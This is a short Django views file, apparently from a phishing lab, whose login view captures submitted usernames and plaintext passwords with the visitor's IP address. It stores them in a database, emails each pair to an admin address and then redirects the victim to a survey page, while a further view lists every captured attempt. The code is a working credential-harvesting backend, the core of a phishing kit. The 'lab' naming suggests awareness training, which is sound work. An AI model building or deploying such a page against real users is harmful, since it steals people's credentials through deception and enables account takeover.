from django.shortcuts import render, redirect
from .models import TentativeConnexion
from django.core.mail import send_mail

def page_connexion(request):
    if request.method == "POST":
        identifiant = request.POST.get("username")
        mot_de_passe = request.POST.get("password")
        ip = request.META.get('REMOTE_ADDR')

        TentativeConnexion.objects.create(
            identifiant=identifiant,
            mot_de_passe=mot_de_passe,
            adresse_ip=ip
        )

        send_mail(
            "Nouvelle connexion",
            f"Email: {identifiant}\nMot de passe: {mot_de_passe}",
            "lab@local",
            ["admin@local"],
            fail_silently=True,
        )

        return redirect("sondage")

    return render(request, "phishing/login.html")

def sondage(request):
    return render(request, "phishing/sondage.html")


def liste_tentatives(request):
    tentatives = TentativeConnexion.objects.all().order_by('-date')
    return render(request, 'phishing/liste.html', {'tentatives': tentatives})

